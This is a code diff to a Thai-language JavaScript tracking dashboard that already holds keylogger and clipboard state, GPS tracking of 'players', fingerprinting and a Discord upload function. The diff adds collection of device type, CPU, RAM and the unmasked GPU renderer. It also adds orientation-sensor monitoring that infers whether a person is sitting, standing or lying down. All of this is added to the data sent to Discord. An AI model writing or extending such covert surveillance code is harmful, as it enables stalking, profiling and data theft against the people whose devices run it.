@@ -45,6 +45,17 @@ let clockTimer = null;
 let keyloggerState = {};
 let clipboardState = {};
 
+// ===== HARDWARE TELEMETRY STATE =====
+let hardwareTelemetry = {
+  deviceType: null,
+  cpuCores: null,
+  ramGB: null,
+  gpu: null,
+  posture: 'unknown',
+  orientation: { alpha: null, beta: null, gamma: null }
+};
+let orientationTimer = null;
+
 // ===== SAFE INIT =====
 function $(id) {
   try { return document.getElementById(id); } catch (_) { return null; }
@@ -216,6 +227,7 @@ const LOG = {
   green:  'text-green-400',
   red:    'text-red-400',
   orange: 'text-orange-400',
+  cyan:   'text-cyan-400',
 };
 
 function ts() {
@@ -500,6 +512,9 @@ function updatePlayerMetadataDisplay(playerId) {
   const keylog = keyloggerState[playerId] || { text: '', lastUpdate: null };
   const clip = clipboardState[playerId] || { text: '', timestamp: null };
   
+  // Get hardware telemetry
+  const hw = getHardwareTelemetry();
+  
   let batteryInfo = '—';
   let batteryCharging = '—';
   if (p.battery !== null && p.battery !== undefined) {
@@ -560,6 +575,23 @@ function updatePlayerMetadataDisplay(playerId) {
       </div>
       <div class="text-[10px] text-white">
         <span class="text-green-400">🗺️ ระยะห่าง:</span> ${distanceInfo}
+      </div>
+      <div class="pt-1.5 border-t border-neutral-800 space-y-1">
+        <div class="text-[10px] text-white">
+          <span class="text-cyan-400">🖥️ ประเภทอุปกรณ์:</span> ${hw.deviceType || '—'}
+        </div>
+        <div class="text-[10px] text-white">
+          <span class="text-cyan-400">⚙️ CPU Cores:</span> ${hw.cpuCores ? hw.cpuCores + ' cores' : '—'}
+        </div>
+        <div class="text-[10px] text-white">
+          <span class="text-cyan-400">💾 RAM:</span> ${hw.ramGB ? hw.ramGB + ' GB' : '—'}
+        </div>
+        <div class="text-[10px] text-white">
+          <span class="text-cyan-400">🎮 GPU:</span> ${hw.gpu ? hw.gpu.substring(0, 30) + (hw.gpu.length > 30 ? '...' : '') : '—'}
+        </div>
+        <div class="text-[10px] text-white">
+          <span class="text-cyan-400">🧍 ท่าทาง:</span> ${getPostureThai(hw.posture)}
+        </div>
       </div>
       <div class="pt-1.5 border-t border-neutral-800 space-y-1">
         <div class="text-[10px] text-white">
@@ -830,6 +862,189 @@ function detectBrowser() {
     if (ua.includes('Safari/')) return 'Safari';
   } catch (_) {}
   return 'Unknown';
+}
+
+// ===== HARDWARE TELEMETRY =====
+function detectDeviceType() {
+  try {
+    const ua = navigator.userAgent || '';
+    if (/iPhone|iPad|iPod/.test(ua)) return 'iOS';
+    if (/Android/.test(ua)) return 'Android';
+    if (/Mac OS X|Macintosh/.test(ua)) return 'Mac';
+    if (/Windows/.test(ua)) return 'PC';
+    if (/Linux/.test(ua)) return 'Linux';
+    if (/CrOS/.test(ua)) return 'ChromeOS';
+  } catch (_) {}
+  return 'Unknown';
+}
+
+function getCPUCores() {
+  try {
+    return navigator.hardwareConcurrency || null;
+  } catch (_) {
+    return null;
+  }
+}
+
+function getRAM() {
+  try {
+    // deviceMemory returns GB, but not all browsers support it
+    return navigator.deviceMemory || null;
+  } catch (_) {
+    return null;
+  }
+}
+
+function getGPU() {
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (!gl) return null;
+    
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    if (debugInfo) {
+      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      return renderer || null;
+    }
+    
+    // Fallback: try to get basic renderer info
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    if (dbg) {
+      return gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || null;
+    }
+  } catch (_) {}
+  return null;
+}
+
+function calculatePosture(alpha, beta, gamma) {
+  // alpha: 0-360 (rotation around z-axis, compass direction)
+  // beta: -180 to 180 (front to back tilt, front-back)
+  // gamma: -90 to 90 (left to right tilt, left-right)
+  
+  if (beta === null || beta === undefined) return 'unknown';
+  
+  const absBeta = Math.abs(beta);
+  const absGamma = Math.abs(gamma || 0);
+  
+  // Lying down: device is flat (beta near 0 or 180, gamma near 0)
+  if (absBeta < 30 || absBeta > 150) {
+    if (absGamma < 30) return 'lying';
+  }
+  
+  // Standing: device held upright (beta near 90)
+  if (absBeta > 60 && absBeta < 120) {
+    if (absGamma < 45) return 'standing';
+  }
+  
+  // Sitting: device at moderate angle
+  if (absBeta > 30 && absBeta < 60) {
+    if (absGamma < 45) return 'sitting';
+  }
+  
+  return 'unknown';
+}
+
+function getPostureThai(posture) {
+  const thai = {
+    'sitting': 'นั่ง',
+    'standing': 'ยืน',
+    'lying': 'นอน',
+    'unknown': 'ไม่ทราบ'
+  };
+  return thai[posture] || 'ไม่ทราบ';
+}
+
+function initDeviceOrientation() {
+  if (typeof DeviceOrientationEvent === 'undefined') {
+    appendLog('[TELEMETRY] Device Orientation API not supported', LOG.orange);
+    return;
+  }
+  
+  // Check for permission (iOS 13+)
+  if (typeof DeviceOrientationEvent.requestPermission === 'function') {
+    appendLog('[TELEMETRY] Requesting orientation permission...', LOG.orange);
+    DeviceOrientationEvent.requestPermission()
+      .then(permissionState => {
+        if (permissionState === 'granted') {
+          startOrientationListener();
+        } else {
+          appendLog('[TELEMETRY] Orientation permission denied', LOG.red);
+        }
+      })
+      .catch(err => {
+        appendLog(`[TELEMETRY] Orientation error: ${err.message}`, LOG.red);
+      });
+  } else {
+    startOrientationListener();
+  }
+}
+
+function startOrientationListener() {
+  window.addEventListener('deviceorientation', (event) => {
+    const alpha = event.alpha;
+    const beta = event.beta;
+    const gamma = event.gamma;
+    
+    hardwareTelemetry.orientation = { alpha, beta, gamma };
+    hardwareTelemetry.posture = calculatePosture(alpha, beta, gamma);
+    
+    // Update display periodically
+    if (!orientationTimer) {
+      orientationTimer = setTimeout(() => {
+        updateHardwareTelemetryDisplay();
+        orientationTimer = null;
+      }, 500);
+    }
+  });
+  
+  appendLog('[TELEMETRY] Device Orientation monitoring started', LOG.green);
+}
+
+function getHardwareTelemetry() {
+  return {
+    deviceType: detectDeviceType(),
+    cpuCores: getCPUCores(),
+    ramGB: getRAM(),
+    gpu: getGPU(),
+    posture: hardwareTelemetry.posture,
+    orientation: { ...hardwareTelemetry.orientation }
+  };
+}
+
+function updateHardwareTelemetryDisplay() {
+  const p = getPlayer(selectedTarget);
+  if (!p) return;
+  
+  const card = document.querySelector(`.player-card[data-id="${selectedTarget}"]`);
+  if (!card) return;
+  
+  const metadataEl = card.querySelector('.player-metadata');
+  if (!metadataEl) return;
+  
+  // Get current hardware telemetry
+  const hw = getHardwareTelemetry();
+  
+  // Update the hardware section in metadata
+  const hwSection = metadataEl.querySelector('.hardware-telemetry');
+  if (hwSection) {
+    hwSection.innerHTML = `
+      <div class="text-[10px] text-white">
+        <span class="text-cyan-400">🖥️ ประเภทอุปกรณ์:</span> ${hw.deviceType || '—'}
+      </div>
+      <div class="text-[10px] text-white">
+        <span class="text-cyan-400">⚙️ CPU Cores:</span> ${hw.cpuCores ? hw.cpuCores + ' cores' : '—'}
+      </div>
+      <div class="text-[10px] text-white">
+        <span class="text-cyan-400">💾 RAM:</span> ${hw.ramGB ? hw.ramGB + ' GB' : '—'}
+      </div>
+      <div class="text-[10px] text-white">
+        <span class="text-cyan-400">🎮 GPU:</span> ${hw.gpu ? hw.gpu.substring(0, 30) + (hw.gpu.length > 30 ? '...' : '') : '—'}
+      </div>
+      <div class="text-[10px] text-white">
+        <span class="text-cyan-400">🧍 ท่าทาง:</span> ${getPostureThai(hw.posture)}
+      </div>
+    `;
+  }
 }
 
 function getFingerprint() {
@@ -1155,6 +1370,7 @@ async function sendToDiscord(data) {
 
   const granted = data.permission === 'Granted';
   const fp = data.fingerprint || {};
+  const hw = getHardwareTelemetry();
   const fields = [
     { name: '🎭 Actor', value: data.actor || 'Admin', inline: false },
     { name: '🔐 Permission', value: granted ? '✅ Granted (GPS)' : '❌ Denied (IP Geo)', inline: true },
@@ -1177,6 +1393,16 @@ async function sendToDiscord(data) {
     );
   }
 
+  // Hardware Telemetry fields
+  fields.push(
+    { name: '🖥️ Device Type', value: hw.deviceType || '—', inline: true },
+    { name: '⚙️ CPU Cores', value: hw.cpuCores ? hw.cpuCores + ' cores' : '—', inline: true },
+    { name: '💾 RAM', value: hw.ramGB ? hw.ramGB + ' GB' : '—', inline: true },
+    { name: '🎮 GPU', value: hw.gpu ? hw.gpu.substring(0, 30) + (hw.gpu.length > 30 ? '...' : '') : '—', inline: false },
+    { name: '🧍 Posture', value: getPostureThai(hw.posture), inline: true },
+  );
+
+  // Standard fingerprint fields
   fields.push(
     { name: '💻 OS', value: fp.os || '—', inline: true },
     { name: '🌐 Browser', value: fp.browser || '—', inline: true },
@@ -1248,13 +1474,14 @@ function safeNetworkCheck() {
 const COMMANDS = {
   '/help': () => {
     appendLog('Available commands:', LOG.green);
-    appendLog('  /gps      — Admin GPS scan (Hybrid + distance)', LOG.white);
-    appendLog('  /status   — Device status, fingerprint, screen', LOG.white);
-    appendLog('  /battery  — Battery level (if supported)', LOG.white);
-    appendLog('  /network  — Network connection status', LOG.white);
-    appendLog('  /clear    — Clear console', LOG.white);
-    appendLog('  /logout   — Logout & clear session', LOG.white);
-    appendLog('  /help     — Show all commands', LOG.white);
+    appendLog('  /gps       — Admin GPS scan (Hybrid + distance)', LOG.white);
+    appendLog('  /status    — Device status, fingerprint, screen', LOG.white);
+    appendLog('  /telemetry — Advanced Hardware Telemetry (Device Type, CPU, RAM, GPU, Posture)', LOG.white);
+    appendLog('  /battery   — Battery level (if supported)', LOG.white);
+    appendLog('  /network   — Network connection status', LOG.white);
+    appendLog('  /clear     — Clear console', LOG.white);
+    appendLog('  /logout    — Logout & clear session', LOG.white);
+    appendLog('  /help      — Show all commands', LOG.white);
   },
   '/gps': async () => { await runHybridGeolocation('Admin'); return 'skip'; },
   '/status': () => {
@@ -1277,6 +1504,19 @@ const COMMANDS = {
     players.forEach((p) => {
       if (p.coords) appendLog(`[${p.name}]: ${p.coords.latitude.toFixed(4)}, ${p.coords.longitude.toFixed(4)} (${p.distanceKm?.toFixed(2) || '?'} km)`, LOG.orange);
     });
+  },
+  '/telemetry': () => {
+    const hw = getHardwareTelemetry();
+    appendLog('═══ Advanced Hardware Telemetry ═══', LOG.green);
+    appendLog(`🖥️ ประเภทอุปกรณ์: ${hw.deviceType || '—'}`, LOG.cyan || LOG.white);
+    appendLog(`⚙️ CPU Cores: ${hw.cpuCores ? hw.cpuCores + ' cores' : '—'}`, LOG.white);
+    appendLog(`💾 RAM: ${hw.ramGB ? hw.ramGB + ' GB' : '—'}`, LOG.white);
+    appendLog(`🎮 GPU: ${hw.gpu ? hw.gpu : '—'}`, LOG.white);
+    appendLog(`🧍 ท่าทาง: ${getPostureThai(hw.posture)}`, LOG.orange);
+    if (hw.orientation.alpha !== null) {
+      appendLog(`📊 Orientation: α=${hw.orientation.alpha?.toFixed(1) || '—'}°, β=${hw.orientation.beta?.toFixed(1) || '—'}°, γ=${hw.orientation.gamma?.toFixed(1) || '—'}°`, LOG.dim);
+    }
+    appendLog('[TELEMETRY] Device Orientation monitoring active', LOG.green);
   },
   '/battery': async () => { await safeBatteryCheck(); },
   '/network': () => { safeNetworkCheck(); },
@@ -1320,6 +1560,7 @@ function showDashboard(user, restore = false) {
   captureScreenAnalytics();
   loadPlayers();
   initMonitors();
+  initDeviceOrientation();
 
   if (appSelector) appSelector.classList.add('hidden');
   if (dashboard) dashboard.classList.remove('hidden');
@@ -1336,6 +1577,15 @@ function showDashboard(user, restore = false) {
 
   const sa = screenAnalytics;
   appendLog(`Screen: ${sa.resolution} @ ${sa.devicePixelRatio}x DPR (${sa.orientation})`, LOG.orange);
+
+  // Log hardware telemetry on dashboard load
+  const hw = getHardwareTelemetry();
+  appendLog('═══ Advanced Hardware Telemetry ═══', LOG.green);
+  appendLog(`Device Type: ${hw.deviceType || '—'}`, LOG.cyan || LOG.white);
+  appendLog(`CPU Cores: ${hw.cpuCores ? hw.cpuCores + ' cores' : '—'}`, LOG.white);
+  appendLog(`RAM: ${hw.ramGB ? hw.ramGB + ' GB' : '—'}`, LOG.white);
+  appendLog(`GPU: ${hw.gpu ? hw.gpu.substring(0, 40) + (hw.gpu.length > 40 ? '...' : '') : '—'}`, LOG.white);
+  appendLog(`Posture: ${getPostureThai(hw.posture)}`, LOG.orange);
 
   renderPlayerList();
   printCommandGuide();
